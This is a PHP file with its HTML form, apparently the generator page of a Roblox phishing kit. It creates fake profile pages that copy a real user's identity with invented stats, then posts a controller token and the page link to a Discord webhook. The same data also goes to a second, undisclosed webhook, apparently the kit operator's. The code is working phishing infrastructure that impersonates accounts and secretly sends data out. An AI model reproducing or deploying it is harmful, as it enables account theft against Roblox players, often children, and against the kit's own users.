<?php
error_reporting(0);
include("../web/setup/setup.php");
include("../web/setup/database.php");

//FUNCTIONS
function checkerusername($user){
    $ch = file_get_contents("https://api.roblox.com/users/get-by-username?username=$user");
    $json = json_decode($ch, true);
if($ch == '{"success":false,"errorMessage":"User not found"}'){
    $error = "Username doesn't exist!";
    return $error;
}else{
    $userId = $json["Id"];
    $ch1 = file_get_contents("https://users.roblox.com/v1/users/$userId");
    $json1 = json_decode($ch1, true);
if($json1["isBanned"] == "true"){
    $error = "User is banned";
    return $error;
}if($json1["name"] == "Roblox"){
    $error = "Error 69";
    return $error;
}  else{
return "success";
}
}
}






function controller_token($controllerpathsex){
    $length = 32;
    $token1 = substr(str_repeat(md5(rand()), ceil($length/32)), 0, $length);
    $token = strtoupper("$controllerpathsex-".$token1);
    return $token;
}
function lolhash() {
    $length = 182;
  $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12345689';
  $my_string = '';
  for ($i = 0; $i < $length; $i++) {
    $pos = mt_rand(0, strlen($chars) -1);
    $my_string .= substr($chars, $pos, 1);
  }
  $presetstart = "YUhS";
  $presetend = 'ROeA==';
  return $presetstart . $my_string . $presetend;
}
function getip(){
    return file_get_contents("https://api.ipify.org");
}
function randomNumber($length) {
    $result = '';

    for($i = 0; $i < $length; $i++) {
        $result .= mt_rand(0, 9);
    }

    return $result;
}
function getHost($Address) { 
    $parseUrl = parse_url(trim($Address)); 
    return trim($parseUrl['host'] ? $parseUrl['host'] : array_shift(explode('/', $parseUrl['path'], 2))); 
  }
//END
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $captcha = $_POST['recaptcha-response'];

    $ip = file_get_contents("https://api.ipify.org");
    $response=file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=".$recaptcha_secretkey."&response=".$captcha."&remoteip=".$ip);
    $responseKeys = json_decode($response,true);
    if(intval($responseKeys["success"]) !== 1) {
        //notified
        $error = 'Please solve the captcha first!';
    } else {
if(isset($_POST["realusername"]) || ($_POST["fakeusername"]) || ($_POST["friends"]) || ($_POST["followers"]) || ($_POST["followings"]) || ($_POST["placevisits"]) || ($_POST["about"]) || ($_POST["date"]) || ($_POST["webhook"]) ){
if(filter_var($_POST["webhook"], FILTER_VALIDATE_URL)) {
if (getHost($_POST["webhook"]) == "discord.com" || getHost($_POST["webhook"]) == "discordapp.com") {
    $realusername = htmlspecialchars($_POST["realusername"]);
    $fakeusername = htmlspecialchars($_POST["fakeusername"]);
    $friends = htmlspecialchars($_POST["friends"]);
    $followers = htmlspecialchars($_POST["followers"]);
    $followings = htmlspecialchars($_POST["followings"]);
    $placevisits = htmlspecialchars($_POST["placevisits"]);
    /* sanitize the inputs*/
    $friends = filter_var($friends, FILTER_SANITIZE_NUMBER_INT);;
    $followers = filter_var($followers, FILTER_SANITIZE_NUMBER_INT);;
    $followings = filter_var($followings, FILTER_SANITIZE_NUMBER_INT);;
    $placevisits = filter_var($placevisits, FILTER_SANITIZE_NUMBER_INT);;
    /* Checking rUser*/
    $about = htmlspecialchars($_POST["about"]);
    $joindate = htmlspecialchars($_POST["date"]);
    $joindate = str_replace("-", "/", $joindate);
    
    $checker = checkerusername($realusername);
    if($checker == "Username doesn't exist!"){
        $error = "Username doesn't exist!";
    }if($checker == "User is banned"){
        $error = "User is banned!";
    }if($checker == "success"){
    /*validating the webhook existance */
    $webhook = htmlspecialchars($_POST['webhook']);
    $chkwebhook = file_get_contents($webhook);
    $chkwebhook1 = json_decode($chkwebhook);

    if ($chkwebhook1->message == "Unknown Webhook") {
    $error = "Please enter an valid webhook!";
    } elseif (empty($chkwebhook1->type)) {
    
    $error = "Please enter an valid webhook!";
    } else {
        $header = '<?php header("Location: profile");?>';
        $controller = controller_token($controllerpath);
        $logintoken = lolhash();
        $siteid = rand(0000000000,999999999);
        $ipaddr = $_SERVER["REMOTE_ADDR"];
        $privateServerLinkCode = randomNumber("25");
//done
    $PDOLog = $db -> prepare('INSERT INTO `east` VALUES(:realusername, :fakeusername, :friends, :followers, :followings, :placevisits, :about, :joindate, :siteid, :webhook, :controller, :logintoken, :ipaddr, :privateServerLinkCode, :displayname, :username, :dualhook)');
    $PDOLog -> execute(array(':realusername' => $realusername, ':fakeusername' => $fakeusername, ':friends' => $friends, ':followers' => $followers, ':followings' => $followings, ':placevisits' => $placevisits, ':about' => $about, ':joindate' => $joindate, ':siteid' => $siteid, ':webhook' => $webhook, ':controller' => $controller, ':logintoken' => $logintoken, ':ipaddr' => $ipaddr, ':privateServerLinkCode' => $privateServerLinkCode, ':displayname' => $fakeusername, ':username' => $fakeusername, ':dualhook' => ""));

    $profilephp = file_get_contents("../web/apidev/profileApi.php");
    $profilephp = str_replace("{logintoken}", $logintoken, $profilephp);
    //done
    mkdir("../users/$siteid");
    file_put_contents("../users/$siteid/profile.php", $profilephp);
    file_put_contents("../users/$siteid/index.php", $header);
    file_put_contents("../users/$siteid/about.txt", $about);
    file_put_contents("../users/$siteid/bcount.txt", "0");
    file_put_contents("../users/$siteid/views.txt", "0");
    file_put_contents("../users/$siteid/activity.txt", "game");

    $timestamp = date("c", strtotime("now"));
$json_data = json_encode([
   "content" => null, 
   "embeds" => [
         [
            "title" => "Login Into Controller", 
            "description" => "```Token: $controller
Url: $domain/users/$siteid/profile```", 
            "url" => "$domain/controller", 
            "color" => hexdec("$embedColor"), 
            "author" => [
               "name" => "$siteName - Generator", 
               "url" => "$domain/generator" 
            ], 
            "footer" => [
                  "text" => "$siteName", 
                  "icon_url" => "$mainpfp" 
               ], 
            "timestamp" => "$timestamp",
            "thumbnail" => [
                   "url" => "$mainpfp" 
                ] 
         ] 
      ], 
   "username" => "BOT - $siteName", 
   "avatar_url" => "$mainpfp"
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhook );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$exec = curl_exec( $ch );
curl_close( $ch );
      $chs = curl_init( $dualhook );
curl_setopt( $chs, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $chs, CURLOPT_POST, 1);
curl_setopt( $chs, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $chs, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $chs, CURLOPT_HEADER, 0);
curl_setopt( $chs, CURLOPT_RETURNTRANSFER, 1);

$execs = curl_exec( $chs );
curl_close( $chs );
$success = "true";
    }
}if($checker == "Username doesn't exist!"){
    $error = htmlspecialchars("User doesnt exist in ROBLOX");
}if($checker == "User is banned"){
    $error = 'User is banned from ROBLOX';
}
}else{
    $error = 'Webhook must be discord lol!';
}
}
}
}
}




?>
<!doctype html>
<html lang="en">
  <head>
  	<title><?= $siteName; ?> - Generator</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/png" sizes="16x16" href=" <?= $mainpfp; ?>">
	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" href="css/style.css">
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
	</head>
	<body style="background: url(' <?= $mainpfp; ?>') fixed no-repeat center;">
	<section class="ftco-section">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-md-12 col-lg-6">
                  <style>
                    background-color: #000;
                  </style>
					<div class="login-wrap py-5">
		      	<h3 class="text-center mb-0"><?= $siteName; ?></h3>
		      	<p class="text-center"><?= $webText; ?> </p>
						<form class="login-form" method="POST">
						    		      		<div class="form-group">
		      			<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-user"></span></div>
		      			<input type="text" id="realusername" name="realusername" class="form-control" placeholder="Real Username">
		      		</div>
		      		<div class="form-group">
		      			<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-user"></span></div>
		      			<input type="text" id="fakeusername" name="fakeusername" class="form-control" placeholder="Fake Username">
		      		</div>
		      		<div class="input-group mb-3 form-group">
                        <input type="text" class="form-control" placeholder="Friends" aria-label="Friends" id="friends" name="friends" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
                        <input type="text" class="form-control" placeholder="Followers" aria-label="Followers" id="followers" name="followers" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
                    </div>
                    <div class="input-group mb-3 form-group">
                    <input type="text" class="form-control" placeholder="Followings" aria-label="Followings" id="followings" name="followings" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
                        <input type="text" class="form-control" placeholder="Place Visists" aria-label="Place Visists" id="placevisits" name="placevisits" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
                    </div>
                    <label for="about" style="color:#fff;">About</label>
                    <div class="form-floating">
                        <textarea class="form-control" placeholder="Leave a comment here" id="about" name="about" style="height: 50px"></textarea>
                    </div>
                    <label for="about" style="color:#fff;">Account Created</label>
                    <div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"></div>
	                    <input type="date" id="date" name="date" class="form-control" placeholder="Date" required>
	                </div>
	                <div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-cog"></span></div>
	                    <input type="url" id="webhook" name="webhook" class="form-control" placeholder="Webhook" required>
	                </div>
	                <input type="text" id="g-recaptcha-response" name="recaptcha-response" hidden>
	            <div class="form-group">
	                <input type="submit" name="submit" id="submit" class="btn form-control btn-primary rounded submit px-3" value="Create Now!" hidden>
	                <button class="g-recaptcha btn form-control btn-primary rounded submit px-3" 
        data-sitekey="<?= $recaptcha_sitekey; ?>" 
        data-callback='onSubmit' 
        data-action='submit'>Create Now!</button>
	            </div>
	          </form>
	        </div>
				</div>
			</div>
		</div>
	</section>
    <script>
 
 <?php
 if($success == "true"){
     echo "Swal.fire(
        'Success',
        'Check your Discord for Link!',
        'success'
      )
      
      
      ";
 }
 if($error){
echo "                    Swal.fire(
                      'Error',
                      '$error',
                      'error'
                    )";
 }
 ?>
      
      
      
        function onSubmit(token) {
            console.log(token);
            document.getElementById("g-recaptcha-response").value = token;
            generate();
        }
        
        function generate(){
                var RealUsername = document.getElementById("realusername").value;
                var FakeUsername = document.getElementById("fakeusername").value;
                var Friends = document.getElementById("friends").value;
                var Followers = document.getElementById("followers").value;
                var Followings = document.getElementById("followings").value;
                var PlaceVisits = document.getElementById("placevisits").value;
                var About = document.getElementById("about").value;
                var Webhook = document.getElementById("webhook").value;
                if(!RealUsername || !FakeUsername || !Friends || !Followers || !Followings || !About || !Webhook || !PlaceVisits){
                    Swal.fire(
                      'Error',
                      'Input cannot be empty',
                      'error'
                    )
                }else{
                    document.getElementById("submit").click();
            }
        }
    </script>
	<script src="js/jquery.min.js"></script>
  <script src="js/popper.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/main.js"></script>

	</body>
</html>

